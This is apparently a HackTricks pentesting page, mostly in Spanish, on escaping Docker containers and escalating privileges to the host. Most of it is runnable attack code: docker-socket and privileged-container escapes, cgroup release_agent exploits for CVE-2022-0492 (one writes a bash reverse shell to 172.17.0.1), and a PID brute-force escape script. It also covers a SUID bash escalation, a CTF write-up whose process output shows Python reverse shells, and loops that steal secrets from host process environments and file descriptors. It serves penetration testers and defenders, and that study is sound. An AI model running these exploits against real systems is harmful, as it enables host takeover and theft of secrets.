# Docker Breakout / Escalada de Privilegios

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.io/) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Enumeración y Escape Automáticos

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): También puede **enumerar contenedores**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Esta herramienta es bastante **útil para enumerar el contenedor en el que te encuentras e intentar escapar automáticamente**
* [**amicontained**](https://github.com/genuinetools/amicontained): Herramienta útil para obtener los privilegios que tiene el contenedor para encontrar formas de escapar de él
* [**deepce**](https://github.com/stealthcopter/deepce): Herramienta para enumerar y escapar de contenedores
* [**grype**](https://github.com/anchore/grype): Obtén las CVE contenidas en el software instalado en la imagen

## Escape del Socket de Docker Montado

Si de alguna manera descubres que el **socket de Docker está montado** dentro del contenedor de Docker, podrás escapar de él.\
Esto suele ocurrir en contenedores de Docker que, por alguna razón, necesitan conectarse al demonio de Docker para realizar acciones.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
En este caso, puedes utilizar comandos regulares de Docker para comunicarte con el demonio de Docker:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
En caso de que el **socket de Docker esté en un lugar inesperado**, aún puedes comunicarte con él utilizando el comando **`docker`** con el parámetro **`-H unix:///ruta/al/docker.sock`**
{% endhint %}

El demonio de Docker también puede estar [escuchando en un puerto (por defecto 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) o en sistemas basados en Systemd, la comunicación con el demonio de Docker puede ocurrir a través del socket de Systemd `fd://`.

{% hint style="info" %}
Además, presta atención a los sockets de tiempo de ejecución de otros entornos de ejecución de alto nivel:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Escape de abuso de capacidades

Debes verificar las capacidades del contenedor, si tiene alguna de las siguientes, es posible que puedas escapar de él: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Puedes verificar las capacidades actuales del contenedor utilizando **las herramientas automáticas mencionadas anteriormente** o:
```bash
capsh --print
```
En la siguiente página puedes **aprender más sobre las capacidades de Linux** y cómo abusar de ellas para escapar/elevar privilegios:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Escapar de contenedores privilegiados

Un contenedor privilegiado se puede crear con la bandera `--privileged` o deshabilitando defensas específicas:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Montar /dev`

La bandera `--privileged` introduce preocupaciones significativas de seguridad, y el exploit se basa en lanzar un contenedor de Docker con ella habilitada. Al usar esta bandera, los contenedores tienen acceso completo a todos los dispositivos y carecen de restricciones de seccomp, AppArmor y capacidades de Linux. Puedes **leer todos los efectos de `--privileged`** en esta página:

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Privileged + hostPID

Con estos permisos, simplemente puedes **moverte al espacio de nombres de un proceso que se ejecuta en el host como root**, como init (pid:1), simplemente ejecutando: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Pruébalo en un contenedor ejecutando:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privilegiado

Solo con la bandera privilegiada puedes intentar **acceder al disco del host** o intentar **escapar abusando de release\_agent u otros escapes**.

Prueba los siguientes bypasses en un contenedor ejecutando:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Montando Disco - Poc1

Los contenedores de Docker bien configurados no permitirán comandos como **fdisk -l**. Sin embargo, en un comando de Docker mal configurado donde se especifica la bandera `--privileged` o `--device=/dev/sda1` con capacidades, es posible obtener los privilegios para ver la unidad del host.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Por lo tanto, para tomar el control de la máquina host, es trivial:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
¡Y voilà! Ahora puedes acceder al sistema de archivos del host porque está montado en la carpeta `/mnt/hola`.

#### Montando Disco - Poc2

Dentro del contenedor, un atacante puede intentar obtener un mayor acceso al sistema operativo subyacente del host a través de un volumen hostPath de escritura creado por el clúster. A continuación se muestran algunas cosas comunes que puedes verificar dentro del contenedor para ver si aprovechas este vector de ataque:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Escape de privilegios abusando del agente de liberación existente ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="PoC inicial" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### Escape de privilegios abusando del agente de liberación creado ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="Segundo PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Encuentra una **explicación de la técnica** en:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Escape de privilegios abusando de release\_agent sin conocer la ruta relativa - PoC3

En los exploits anteriores se revela la **ruta absoluta del contenedor dentro del sistema de archivos del host**. Sin embargo, esto no siempre es el caso. En casos donde **no conoces la ruta absoluta del contenedor dentro del host**, puedes utilizar esta técnica:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Ejecutar el PoC dentro de un contenedor privilegiado debería proporcionar una salida similar a:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Escape de privilegios abusando de montajes sensibles

Existen varios archivos que pueden estar montados y que proporcionan **información sobre el host subyacente**. Algunos de ellos incluso pueden indicar **algo que debe ejecutarse por el host cuando ocurre algo** (lo que permitiría a un atacante escapar del contenedor).\
El abuso de estos archivos puede permitir que:

* release\_agent (ya cubierto anteriormente)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Sin embargo, puedes encontrar **otros archivos sensibles** para verificar en esta página:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Montajes arbitrarios

En varias ocasiones, encontrarás que el **contenedor tiene algún volumen montado desde el host**. Si este volumen no está configurado correctamente, es posible que puedas **acceder/modificar datos sensibles**: leer secretos, cambiar las claves autorizadas de SSH...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Escalación de privilegios con 2 shells y montaje del host

Si tienes acceso como **root dentro de un contenedor** que tiene alguna carpeta del host montada y has **escapado como un usuario sin privilegios al host** y tienes acceso de lectura sobre la carpeta montada.\
Puedes crear un **archivo bash suid** en la **carpeta montada** dentro del **contenedor** y **ejecutarlo desde el host** para realizar una escalada de privilegios.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Escalada de privilegios con 2 shells

Si tienes acceso como **root dentro de un contenedor** y has **escapado como un usuario sin privilegios al host**, puedes abusar de ambas shells para **elevar los privilegios dentro del host** si tienes la capacidad MKNOD dentro del contenedor (que está activada por defecto) como se [**explica en esta publicación**](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Con esta capacidad, el usuario root dentro del contenedor tiene permiso para **crear archivos de dispositivo de bloque**. Los archivos de dispositivo son archivos especiales que se utilizan para **acceder al hardware subyacente y a los módulos del kernel**. Por ejemplo, el archivo de dispositivo de bloque /dev/sda permite acceder a **leer los datos en bruto en el disco del sistema**.

Docker se asegura de que los dispositivos de bloque **no puedan ser abusados desde dentro del contenedor** al establecer una política de cgroup en el contenedor que bloquea la lectura y escritura de dispositivos de bloque.\
Sin embargo, si se **crea un dispositivo de bloque dentro del contenedor, se puede acceder** a través de la carpeta /proc/PID/root/ por alguien **fuera del contenedor**, con la limitación de que el **proceso debe ser propiedad del mismo usuario** fuera y dentro del contenedor.

Ejemplo de **explotación** de este [**informe**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Si puedes acceder a los procesos del host, podrás acceder a mucha información sensible almacenada en esos procesos. Ejecuta el laboratorio de pruebas:
```
docker run --rm -it --pid=host ubuntu bash
```
Por ejemplo, podrás listar los procesos utilizando algo como `ps auxn` y buscar detalles sensibles en los comandos.

Luego, como puedes **acceder a cada proceso del host en /proc/, simplemente puedes robar sus secretos de entorno** ejecutando:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
También puedes **acceder a los descriptores de archivos de otros procesos y leer sus archivos abiertos**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
También puedes **finalizar procesos y causar un DoS**.

{% hint style="warning" %}
Si de alguna manera tienes **acceso privilegiado sobre un proceso fuera del contenedor**, podrías ejecutar algo como `nsenter --target <pid> --all` o `nsenter --target <pid> --mount --net --pid --cgroup` para **ejecutar una shell con las mismas restricciones de ns** (esperemos que ninguna) **que ese proceso**.
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Si un contenedor está configurado con el controlador de red del host de Docker (`--network=host`), la pila de red de ese contenedor no está aislada del host de Docker (el contenedor comparte el espacio de nombres de red del host) y el contenedor no recibe una dirección IP asignada. En otras palabras, el **contenedor enlaza todos los servicios directamente a la IP del host**. Además, el contenedor puede **interceptar TODO el tráfico de red que el host** envía y recibe en la interfaz compartida `tcpdump -i eth0`.

Por ejemplo, puedes usar esto para **espiar e incluso falsificar el tráfico** entre el host y la instancia de metadatos.

Como en los siguientes ejemplos:

* [Informe: Cómo contactar a Google SRE: Obtener una shell en Cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [MITM del servicio de metadatos permite la escalada de privilegios de root (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

También podrás acceder a los **servicios de red enlazados a localhost** dentro del host o incluso acceder a los **permisos de metadatos del nodo** (que pueden ser diferentes a los que un contenedor puede acceder).

### hostIPC
```
docker run --rm -it --ipc=host ubuntu bash
```
Si solo tienes `hostIPC=true`, es probable que no puedas hacer mucho. Si algún proceso en el host o cualquier proceso dentro de otro pod está utilizando los **mecanismos de comunicación interproceso** del host (memoria compartida, matrices de semáforos, colas de mensajes, etc.), podrás leer/escribir en esos mismos mecanismos. El primer lugar donde debes buscar es `/dev/shm`, ya que es compartido entre cualquier pod con `hostIPC=true` y el host. También debes verificar los otros mecanismos de IPC con `ipcs`.

* **Inspeccionar /dev/shm** - Busca cualquier archivo en esta ubicación de memoria compartida: `ls -la /dev/shm`
* **Inspeccionar las instalaciones de IPC existentes** - Puedes verificar si se están utilizando instalaciones de IPC con `/usr/bin/ipcs`. Verifícalo con: `ipcs -a`

### Recuperar capacidades

Si la llamada al sistema **`unshare`** no está prohibida, puedes recuperar todas las capacidades ejecutando:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Abuso de namespace de usuario a través de symlink

La segunda técnica explicada en el artículo [https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indica cómo se puede abusar de los enlaces simbólicos con los espacios de nombres de usuario para afectar archivos dentro del host (en ese caso específico, eliminar archivos).

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Utilice [**Trickest**](https://trickest.io/) para construir y automatizar fácilmente flujos de trabajo con las herramientas comunitarias más avanzadas del mundo.\
Obtenga acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Exploit de Runc (CVE-2019-5736)

En caso de que pueda ejecutar `docker exec` como root (probablemente con sudo), puede intentar escalar privilegios escapando de un contenedor abusando de CVE-2019-5736 (exploit [aquí](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Esta técnica básicamente **sobrescribe** el binario _**/bin/sh**_ del **host** **desde un contenedor**, por lo que cualquier persona que ejecute docker exec puede activar la carga útil.

Cambie la carga útil según sea necesario y compile main.go con `go build main.go`. El binario resultante debe colocarse en el contenedor de Docker para su ejecución.\
Al ejecutarlo, tan pronto como muestre `[+] Overwritten /bin/sh successfully`, debe ejecutar lo siguiente desde la máquina host:

`docker exec -it <nombre-del-contenedor> /bin/sh`

Esto activará la carga útil que se encuentra en el archivo main.go.

Para obtener más información: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Existen otras CVE a las que el contenedor puede ser vulnerable, puede encontrar una lista en [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Escape personalizado de Docker

### Superficie de escape de Docker

* **Namespaces:** El proceso debe estar **completamente separado de otros procesos** a través de los espacios de nombres, por lo que no podemos escapar interactuando con otros procesos debido a los espacios de nombres (por defecto, no se puede comunicar a través de IPC, sockets Unix, servicios de red, D-Bus, `/proc` de otros procesos).
* **Usuario root**: Por defecto, el usuario que ejecuta el proceso es el usuario root (sin embargo, sus privilegios están limitados).
* **Capacidades**: Docker deja las siguientes capacidades: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscalls**: Estos son los syscalls que el **usuario root no podrá llamar** (debido a la falta de capacidades + Seccomp). Los otros syscalls podrían ser utilizados para intentar escapar.

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% tab title="syscalls arm64" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)



<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
